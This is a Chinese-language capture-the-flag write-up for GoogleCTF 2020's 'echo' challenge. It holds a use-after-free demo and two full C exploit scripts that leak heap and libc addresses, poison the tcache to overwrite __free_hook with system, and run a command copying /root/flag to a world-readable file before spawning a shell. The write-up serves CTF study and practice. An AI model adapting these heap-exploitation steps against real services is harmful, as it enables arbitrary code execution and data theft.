## GoogleCTF 2020
### echo 
#### demo
```c
int main()
{
	char pad[] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\n";
	int fds[0x10];
	memset(fds,0,0x10*sizeof(int));
	void *buf = malloc(0x10000);
	int i;
	for(i = 0; i < 3 ; i++)
	{
		fds[i] = connect_with();
		write(fds[i],pad,0x20);
		usleep(1000);
	}
	
	close(fds[0])
	usleep(1000);
	write(fds[2],"FMYY",4);
	close(fds[1]);
	usleep(1000);
	getchar();
}
```
上述则是demo,因为析构的原因,指针位置交换,然后write的时候,会把数据写在已经free的一个块上,导致可以引起UAF

参考了 [GoogleCTF 2020 echo](http://blog.redrocket.club/2020/08/30/google-ctf-quals-2020-echo/)
然后抄了一遍利用的脚本

#### exploit
```c
int main()
{
	int fds[0x10];
	memset(fds,0,0x10*sizeof(int));
	char *buf = malloc(0x10000);
	memset(buf,0,0x10000);
	int i;
	for(i = 1; i < 0x10000/8 ;i+=2)
	{
		*((size_t*)buf+i) = 0x31;
	}
	for(i = 0; i < 0x10 ; i++)
	{
		fds[i] = connect_with();
		usleep(1000);
	}
	write(fds[0],buf,0x10000 - 1);
	for(i = 1; i < 9; i++)
	{
		writeall(fds[i],buf, 0x10000 >> i); //这里是把unsorted bin中的chunk清空作用,为了让后面申请的块位于0x10010那个块的后面
		usleep(1000);
	}
	
	write(fds[13], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[14], "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM", 0x20);
    write(fds[15], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    usleep(1000);
    
    close(fds[13]);
    usleep(1000);
    write(fds[15],"\x00",1);
    close(fds[14]);
    usleep(1000);
    fds[13] = connect_with();
    fds[14] = connect_with();
    
    write(fds[13],"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP",0x20);
    usleep(1000);
    write(fds[14],"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",0x20);
    usleep(1000);
    
    close(fds[14]);
    usleep(1000);
    
    write(fds[0],"\n",1);
    do {
        read(fds[0], buf, 1);
    } while(*buf != '\n');
    
    readall(fds[0], buf, 0x10000);
    
    size_t *leak = memmem(buf,0x10000,"QQQQQQQQ",8);
    if(!leak)
    {
    	puts("No HEAP :(");
    	exit(0);
    }
    size_t heap_base = leak[-1];
    printf("HEAP:\t%#lx\n",heap_base);
    
    /////////////////////////////////////////////////
    
    close(fds[15]);
    close(fds[13]);
    usleep(1000);
    fds[13] = connect_with();
    usleep(1000);
    fds[14] = connect_with();
    usleep(1000);
    fds[15] = connect_with();
    
   	write(fds[13], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[14], "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM", 0x20);
    usleep(1000);
    write(fds[15], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    usleep(1000);
    
    close(fds[13]);
    usleep(1000);
    
    size_t target = heap_base + OFFSET_HEAP;
    write(fds[15],&target,7);
    close(fds[14]);
    usleep(1000);
    
    fds[13] = connect_with();
    fds[14] = connect_with();
    
    usleep(1000);
    
    write(fds[13],"MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",0x20);
    ((size_t*)buf)[0] = 0;
    ((size_t*)buf)[1] = 0x811;
    ((size_t*)buf)[2] = 0;
    ((size_t*)buf)[3] = 0;
    usleep(1000);
    write(fds[14], buf, 0x20);
    
    write(fds[5],"\n",1); // free the chunk that its size is 0x811
    
    usleep(1000);
    write(fds[14],"UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\n",0x40);
    usleep(1000);
    do {
        read(fds[14], buf, 1);
    } while(*buf != '\n');
    read(fds[14],buf,0x20);
    usleep(1000);
    if( *((size_t*)buf+1) != 0x71)
    {
    	puts("No LIBC :(");
    	exit(0);
    }
    size_t libc_base = *((size_t*)buf + 3) - OFFSET_LIBC;
    printf("LIBC:\t%#lx\n",libc_base);
	
	size_t free_hook = libc_base + OFFSET_FREE_HOOK;
	size_t SYSTEM = libc_base + OFFSET_SYSTEM;
	
	fds[16] = connect_with();
	usleep(1000);
	fds[17] = connect_with();
	usleep(1000);
	fds[18] = connect_with();
	usleep(1000);
	write(fds[16], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[17], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[18], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    
    
    close(fds[16]);
    write(fds[18],&free_hook,7);
    close(fds[17]);
    usleep(1000);
    
    fds[16] = connect_with();
    fds[17] = connect_with();
    
    usleep(1000);
    
    write(fds[16],"SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS",0x20);
    usleep(1000);
    write(fds[17],&SYSTEM,0x20);
    
    fds[19] = connect_with();
    usleep(1000);
    write(fds[19],"/bin/cp /root/flag /tmp; /bin/chmod a+r /tmp/flag\0",0x50);
    
    close(fds[19]);
    fflush(stdout);
    system("/bin/sh");
	
	
}
```
	
	1. 首先申请一个0x10010的块,利用UAF和write(fd,"\x00",1);往一个释放的0x30的块中写入两个\x00字节,然后把块可以申请到0x10010,即fds[0]对应的chunk中,再利用write(fd,"\n",1);在fds[0]补上一个\n,再接受返回的信息,用memmem确定位置,拿到heap_base,就能通过读fds[0],从而获取heap_base
	2. 然后tcache poison 的利用将一个块申请到一个大于0x410的chunk header处,然后free这个这个chunk,让这个chunk 进入unsorted bin,再就是切割这个unsorted bin可以拿到libc地址
	3. 最后就是同样的道理,tcache poison将free_hook修改成system,再让程序结束的时候,控制参数,将/root/目录下的flag文件拷贝到/tmp目录,并赋予可读权限
	
然后因为这里完全只需要leak libc地址即可,heap base 完全可以不需要  
精简下利用脚本  
可以变成
```c
int main()
{
	int fds[0x10];
	memset(fds,0,0x10*sizeof(int));
	char *buf = malloc(0x10000);
	memset(buf,0,0x10000);
	int i;
	for(i = 1; i < 0x10000/8 ;i+=2)
	{
		*((size_t*)buf+i) = 0x501;
	}
	for(i = 0; i < 0x10 ; i++)
	{
		fds[i] = connect_with();
		usleep(1000);
	}
	write(fds[0],buf,0x10000 - 1);
	for(i = 1; i < 9; i++)
	{
		writeall(fds[i],buf, 0x10000 >> i);
		usleep(1000);
	}
	
	write(fds[13], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[14], "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM", 0x20);
    write(fds[15], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    usleep(1000);
    
    close(fds[13]);
    usleep(1000);
    write(fds[15],"\x00",1);
    close(fds[14]);
    usleep(1000);
    fds[13] = connect_with();
    fds[14] = connect_with();
    
    write(fds[13],"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP",0x20);
    usleep(1000);
    write(fds[14],"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",0x20);
    usleep(1000);
    
    close(fds[14]);
    usleep(1000);
    
    write(fds[0],"\n",1);
    do {
        read(fds[0], buf, 1);
    } while(*buf != '\n');
    
    readall(fds[0], buf, 0x10000);
    
    char *leak = memmem(buf,0x10000,"\x7F",1);
    if(!leak)
    {
    	puts("No LIBC :(");
    	exit(0);
    }
    size_t libc_base = *(size_t*)(leak - 5) - OFFSET_LIBC;
    printf("LIBC:\t%#lx\n",libc_base);
	size_t free_hook = libc_base + OFFSET_FREE_HOOK;
	size_t SYSTEM = libc_base + OFFSET_SYSTEM;
	fds[16] = connect_with();
	usleep(1000);
	fds[17] = connect_with();
	usleep(1000);
	fds[18] = connect_with();
	usleep(1000);
	write(fds[16], "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 0x20);
    usleep(1000);
    write(fds[17], "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM", 0x20);
    usleep(1000);
    write(fds[18], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    usleep(1000);
    
    
    close(fds[16]);
    write(fds[18],&free_hook,7);
    close(fds[17]);
    usleep(1000);
    
    fds[16] = connect_with();
    fds[17] = connect_with();
    
    usleep(1000);
    
    write(fds[16],"SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS",0x20);
    usleep(1000);
    write(fds[17],&SYSTEM,0x20);
    
    fds[19] = connect_with();
    usleep(1000);
    write(fds[19],"/bin/cp /root/flag /tmp; /bin/chmod a+r /tmp/flag\0",0x50);
    
    close(fds[19]);
    fflush(stdout);
    system("/bin/sh");
	
}
```
	
	1. 此处是将一个块申请到0x10010的chunk 中间,因为tcache申请的时候,不会修改chunk header,所以预先将header设置好,然后再利用close关闭这个socket通道让这个块free进unsorted bin中,再利用read 读0x10010的chunk 拿到libc
	2. 同理 tcache poision修改free_hook为system,控制参数将/root/下的flag文件拷贝出来
